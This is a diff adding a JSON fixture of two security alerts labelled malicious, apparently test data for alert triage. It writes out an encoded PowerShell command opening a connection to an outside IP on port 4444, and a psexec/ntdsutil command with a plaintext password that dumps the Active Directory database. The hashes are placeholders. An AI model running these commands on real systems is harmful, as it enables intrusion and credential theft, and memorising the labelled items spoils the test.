@@ -1,0 +1,43 @@
+[
+  {
+    "alert_id": "ALERT-MALICIOUS-001",
+    "timestamp": "2026-11-02T02:44:11Z",
+    "event_type": "ProcessCreation",
+    "severity": "CRITICAL",
+    "asset_id": "DEV-WRK-882",
+    "source_ip": "194.26.29.112",
+    "user": "CORP\\dev_user_alex",
+    "parent_process": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+    "process_name": "powershell.exe",
+    "command_line": "powershell.exe -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADQALgAyADYALgAyADkALgAxADEAMgAiACwANAA0ADQANAApADsA",
+    "decoded_command": "$client = New-Object System.Net.Sockets.TCPClient('194.26.29.112',4444);",
+    "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+    "matched_rule": "Office Application Spawning Encoded PowerShell (T1204.002)",
+    "context": {
+      "change_ticket_id": null,
+      "digital_signature": "Unsigned / Invalid",
+      "parent_is_trusted_service": false
+    },
+    "ground_truth": "MALICIOUS"
+  },
+  {
+    "alert_id": "ALERT-MALICIOUS-002",
+    "timestamp": "2026-11-02T05:12:00Z",
+    "event_type": "RemoteExecution",
+    "severity": "CRITICAL",
+    "asset_id": "DC-PRIMARY-01",
+    "source_ip": "10.0.50.82",
+    "user": "CORP\\dev_user_alex",
+    "parent_process": "cmd.exe",
+    "process_name": "psexec.exe",
+    "command_line": "psexec.exe \\\\dc01.corp.internal -u CORP\\dev_user_alex -p P@ssw0rd123! -s cmd.exe /c ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\temp\\dump\" q q",
+    "sha256": "7a35b12849128409182049182049182049182049182049182049182049182049",
+    "matched_rule": "NTDS.dit Active Directory Database Dumping (T1003.003)",
+    "context": {
+      "change_ticket_id": null,
+      "digital_signature": "Unsigned payload",
+      "parent_is_trusted_service": false
+    },
+    "ground_truth": "MALICIOUS"
+  }
+]
